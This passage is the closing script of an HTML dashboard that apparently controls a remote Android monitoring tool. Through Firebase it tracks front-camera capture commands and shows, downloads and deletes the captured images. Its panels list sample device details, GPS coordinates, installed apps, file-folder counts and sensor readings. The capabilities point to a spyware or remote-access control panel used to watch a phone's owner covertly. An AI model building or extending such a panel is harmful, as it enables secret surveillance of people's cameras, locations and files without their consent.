                     style="max-width: 100%; max-height: 200px; border-radius: 8px; cursor: pointer;"
                     onclick="openImageModal(${JSON.stringify(imageData).replace(/"/g, '&quot;')})"
                     alt="Latest capture">
                <p style="margin-top: 8px; font-size: 0.8rem; color: var(--gray);">
                    Captured: ${new Date(imageData.timestamp).toLocaleString()}
                </p>
            `;
        }

        // Open image in modal
        function openImageModal(imageData) {
            modalImage.src = 'data:image/jpeg;base64,' + imageData.image_data;
            modalTitle.textContent = imageData.filename || 'Captured Image';
            modalTime.textContent = 'Time: ' + new Date(imageData.timestamp).toLocaleString();
            modalSize.textContent = 'Size: ' + Math.round(imageData.size / 1024) + ' KB';
            
            // Set download functionality
            downloadBtn.onclick = () => downloadImage(imageData);
            
            imageModal.style.display = 'block';
        }

        // Close modal
        closeModal.addEventListener('click', () => {
            imageModal.style.display = 'none';
        });

        // Close modal when clicking outside
        window.addEventListener('click', (event) => {
            if (event.target === imageModal) {
                imageModal.style.display = 'none';
            }
        });

        // Download image
        function downloadImage(imageData) {
            const link = document.createElement('a');
            link.href = 'data:image/jpeg;base64,' + imageData.image_data;
            link.download = imageData.filename || `capture_${imageData.timestamp}.jpg`;
            link.click();
        }

        // Delete image from Firebase
        function deleteImage(key) {
            if (!imagesRef) return;
            
            if (confirm('Are you sure you want to delete this image?')) {
                imagesRef.child(key).remove()
                    .then(() => {
                        showNotification('Image deleted successfully');
                        loadImages(); // Reload gallery
                    })
                    .catch(error => {
                        console.error('Error deleting image:', error);
                        showNotification('Failed to delete image', 'error');
                    });
            }
        }

        // Update image statistics
        function updateImageStats(images) {
            if (!images) {
                document.getElementById('lastCaptureTime').textContent = 'Never';
                document.getElementById('storageUsed').textContent = '0 KB';
                document.getElementById('averageSize').textContent = '0 KB';
                return;
            }

            const imageArray = Object.values(images);
            const totalSize = imageArray.reduce((sum, img) => sum + (img.size || 0), 0);
            const latestImage = imageArray[imageArray.length - 1]; // Last image is newest
            
            document.getElementById('lastCaptureTime').textContent = 
                new Date(latestImage.timestamp).toLocaleString();
            document.getElementById('storageUsed').textContent = 
                Math.round(totalSize / 1024) + ' KB';
            document.getElementById('averageSize').textContent = 
                Math.round(totalSize / imageArray.length / 1024) + ' KB';
        }

        // Populate with sample data
        function populateSampleData() {
            // Device Info
            document.getElementById('deviceInfo').innerHTML = `
                <li><span class="data-key">Device ID:</span><span class="data-value">a1b2c3d4e5f6</span></li>
                <li><span class="data-key">Brand:</span><span class="data-value">Samsung</span></li>
                <li><span class="data-key">Model:</span><span class="data-value">Galaxy S21</span></li>
                <li><span class="data-key">OS Version:</span><span class="data-value">Android 12</span></li>
                <li><span class="data-key">Last Update:</span><span class="data-value">2 minutes ago</span></li>
            `;

            // Network Info
            document.getElementById('networkInfo').innerHTML = `
                <li><span class="data-key">IP Address:</span><span class="data-value">192.168.1.105</span></li>
                <li><span class="data-key">Connection Type:</span><span class="data-value">WiFi</span></li>
                <li><span class="data-key">Signal Strength:</span><span class="data-value">Excellent</span></li>
                <li><span class="data-key">Data Usage:</span><span class="data-value">1.2 GB</span></li>
            `;

            // Recent Activity
            document.getElementById('recentActivity').innerHTML = `
                <li><span class="data-key">Location Update</span><span class="data-value">2 min ago</span></li>
                <li><span class="data-key">Battery Check</span><span class="data-value">5 min ago</span></li>
                <li><span class="data-key">App List Refresh</span><span class="data-value">10 min ago</span></li>
                <li><span class="data-key">File Scan</span><span class="data-value">15 min ago</span></li>
            `;

            // Location Details
            document.getElementById('locationDetails').innerHTML = `
                <li><span class="data-key">Latitude:</span><span class="data-value">28.6139° N</span></li>
                <li><span class="data-key">Longitude:</span><span class="data-value">77.2090° E</span></li>
                <li><span class="data-key">Accuracy:</span><span class="data-value">12 meters</span></li>
                <li><span class="data-key">Last Update:</span><span class="data-value">2 minutes ago</span></li>
                <li><span class="data-key">Provider:</span><span class="data-value">GPS</span></li>
            `;

            // Installed Apps
            document.getElementById('installedApps').innerHTML = `
                <li><span class="data-key">WhatsApp</span><span class="data-value">User App</span></li>
                <li><span class="data-key">Instagram</span><span class="data-value">User App</span></li>
                <li><span class="data-key">Google Maps</span><span class="data-value">System App</span></li>
                <li><span class="data-key">Camera</span><span class="data-value">System App</span></li>
                <li><span class="data-key">Chrome</span><span class="data-value">System App</span></li>
            `;

            // File System
            document.getElementById('fileSystem').innerHTML = `
                <li><span class="data-key">Download</span><span class="data-value">24 files</span></li>
                <li><span class="data-key">DCIM</span><span class="data-value">156 files</span></li>
                <li><span class="data-key">Documents</span><span class="data-value">18 files</span></li>
                <li><span class="data-key">Movies</span><span class="data-value">5 files</span></li>
            `;

            // Sensor Data
            document.getElementById('sensorData').innerHTML = `
                <li><span class="data-key">Accelerometer X:</span><span class="data-value">0.12 m/s²</span></li>
                <li><span class="data-key">Accelerometer Y:</span><span class="data-value">-0.05 m/s²</span></li>
                <li><span class="data-key">Accelerometer Z:</span><span class="data-value">9.81 m/s²</span></li>
                <li><span class="data-key">Gyroscope X:</span><span class="data-value">0.02 rad/s</span></li>
                <li><span class="data-key">Gyroscope Y:</span><span class="data-value">-0.01 rad/s</span></li>
                <li><span class="data-key">Gyroscope Z:</span><span class="data-value">0.05 rad/s</span></li>
                <li><span class="data-key">Light Level:</span><span class="data-value">245 lux</span></li>
                <li><span class="data-key">Proximity:</span><span class="data-value">5.2 cm</span></li>
            `;
        }

        // Simulate data updates
        function simulateDataUpdate() {
            // Update battery level with random value between 60-70%
            const newBatteryLevel = Math.floor(Math.random() * 10) + 60;
            document.getElementById('batteryLevel').textContent = `${newBatteryLevel}%`;
            
            // Update battery chart
            batteryChart.data.labels.push(new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit'}));
            batteryChart.data.datasets[0].data.push(newBatteryLevel);
            
            // Keep only last 6 data points
            if (batteryChart.data.labels.length > 6) {
                batteryChart.data.labels.shift();
                batteryChart.data.datasets[0].data.shift();
            }
            
            batteryChart.update();
            
            // Update sensor data with small random variations
            sensorChart.data.datasets[0].data = sensorChart.data.datasets[0].data.map(value => 
                value + (Math.random() * 0.1 - 0.05)
            );
            sensorChart.update();
            
            // Show notification
            showNotification('Data refreshed successfully');
        }

        // Show notification
        function showNotification(message, type = 'success') {
            const notification = document.createElement('div');
            const backgroundColor = type === 'success' ? 'var(--secondary)' : 'var(--danger)';
            
            notification.style.cssText = `
                position: fixed;
                top: 20px;
                right: 20px;
                background: ${backgroundColor};
                color: white;
                padding: 12px 20px;
                border-radius: 8px;
                box-shadow: 0 4px 12px rgba(0,0,0,0.15);
                z-index: 1000;
                animation: slideInRight 0.3s, slideOutRight 0.3s 2.7s;
            `;
            notification.textContent = message;
            document.body.appendChild(notification);
            
            setTimeout(() => {
                notification.remove();
            }, 3000);
        }

        // Initialize the dashboard
        document.addEventListener('DOMContentLoaded', () => {
            populateSampleData();
            checkCommandStatus();
            loadImages();
            
            // Set up real-time listener for command changes
            if (commandsRef) {
                commandsRef.child('front_camera').on('value', (snapshot) => {
                    const status = snapshot.val();
                    updateFrontCamStatus(status);
                });
            }
            
            // Set up real-time listener for new images
            if (imagesRef) {
                imagesRef.orderByChild('timestamp').limitToLast(1).on('child_added', (snapshot) => {
                    const newImage = snapshot.val();
                    addCommandLog(`New front camera image captured`);
                    showNotification('New image captured!');
                    loadImages(); // Reload gallery to show new image
                });
            }
            
            // Add CSS for notification animation
            const style = document.createElement('style');
            style.textContent = `
                @keyframes slideInRight {
                    from { transform: translateX(100%); opacity: 0; }
                    to { transform: translateX(0); opacity: 1; }
                }
                @keyframes slideOutRight {
                    from { transform: translateX(0); opacity: 1; }
                    to { transform: translateX(100%); opacity: 0; }
                }
            `;
            document.head.appendChild(style);
        });
    </script>
</body>
</html>